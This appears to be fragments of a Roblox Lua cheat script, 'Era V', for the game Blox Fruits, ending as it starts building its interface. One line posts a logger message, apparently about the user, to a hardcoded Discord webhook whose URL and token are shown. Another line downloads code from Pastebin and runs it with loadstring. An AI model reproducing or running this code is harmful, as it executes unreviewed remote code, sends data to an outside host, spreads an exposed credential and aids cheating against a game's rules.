...
NotificationLibrary:SendNotification("Era V", "Warning: script might crashing on some device!", 10)
...
PostWebhook("https://discord.com/api/webhooks/1261256696429285437/YpLXBFfQuNK1YAWBdb1U6ZS5W-nLjxzi1knshZS_Aw8eCPjpzCc_k5C1BllaUsZbtwXv", AdminLoggerMsg()) -- Post to admin webhook
...
local InterfaceManager = loadstring(game:HttpGet("https://pastebin.com/raw/fy2Qqqsn"))()
local Window = Fluent:CreateWindow({
    Title = "Era V - Blox Fruits",
